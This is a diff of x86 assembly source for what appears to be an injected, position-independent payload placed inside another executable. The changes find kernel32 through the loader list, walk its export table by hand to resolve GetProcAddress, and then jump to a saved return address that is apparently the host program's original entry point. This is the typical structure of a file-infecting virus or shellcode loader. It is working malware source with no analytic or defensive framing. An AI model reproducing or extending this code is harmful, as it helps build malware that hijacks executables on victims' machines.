@@ -24,8 +24,8 @@ data:
 	returnAddr          DWORD 000000000h
 
 start:
-	call _getAddr_ ; get the injected .exe's environment instruction pointer
-_getAddr_:
+	call get_eip ; get the injected .exe's environment instruction pointer
+get_eip:
 	pop ebx
 	; ebx holds "data section" address
 	; (call instruction + (start label address - data label instruction))
@@ -75,16 +75,59 @@ loop_find_kernel32_continue:
 loop_find_kernel32_end:
 	; ->DllBase, for some reason, does not hold the base address
 	; instead ->Reserved2[0] does
-	mov edx, (LDR_DATA_TABLE_ENTRY PTR [edx]).Reserved2 + (sizeof DWORD * 0)
+	mov ebx, (LDR_DATA_TABLE_ENTRY PTR [edx]).Reserved2[0 * sizeof PVOID]
+	mov edx, ebx
 	; get PE header (base address + offset from the DOS header)
 	add edx, [edx + 03Ch]
 	; get export table
-	add edx, [edx + 078h]
+	mov edx, [edx + 078h]
+	add edx, ebx
+	push edx ; save export table on the stack
+
+	; get function names array
+	mov edx, [edx + 020h] ; AddressOfNames
+	add edx, ebx
+	xor ecx, ecx ; index = 0
+	; loop trough export function names
+loop_find_gpa:
+	mov eax, [edx + ecx]
+	add eax, ebx
+	; check the string with "GetProcA", should be enough
+	; in reverse because of the endianness
+	mov edi, [eax]
+	cmp edi, 'PteG'
+	jne loop_find_gpa_continue
+	mov edi, [eax + 4]
+	cmp edi, 'Acor'
+	jne loop_find_gpa_continue
+	jmp loop_find_gpa_end
+loop_find_gpa_continue:
+	add ecx, sizeof LPSTR ; index += 1
+	jmp loop_find_gpa
+loop_find_gpa_end:
+	pop edx ; get the export table back
+	mov eax, edx
+	; now use this index to find the function ordinal (address array index)
+	mov edx, [edx + 024h] ; AddressOfNameOrdinals
+	add edx, ebx
+	shr ecx, 1 ; index /= 2 (32 bit array -> 16 bit array)
+	xor edi, edi
+	mov di, [edx + ecx]
+	shl edi, 2 ; index *= 4 (sizeof PVOID)
+	mov edx, eax
+	; now use the ordinal to get the function address
+	mov edx, [edx + 01Ch] ; AddressOfFunctions
+	add edx, ebx
+	mov edx,[edx + edi]
+	add edx, ebx
 
 	pop ebx
 	; allocate space on the stack, sp register instead of esp because
 	; the structure size fits in a WORD, saves on instruction size
 	sub sp, sizeof STACK_STORAGE
+
+	; store GetProcAddress address
+	mov (STACK_STORAGE PTR [esp]).GPAAddr, edx
 
 	lea edx, (STACK_STORAGE PTR [esp]).currentExe
 	push MAX_PATH
@@ -149,10 +192,10 @@ loop_find_file_end:
 
 	mov eax, [ebx + (returnAddr - data)]
 	cmp eax, 0
-	jne return_to_exec
+	je end_of_code
+	jmp eax
+end_of_code:
 	push 0
 	call ExitProcess
-return_to_exec:
-	jmp eax
 
 end start
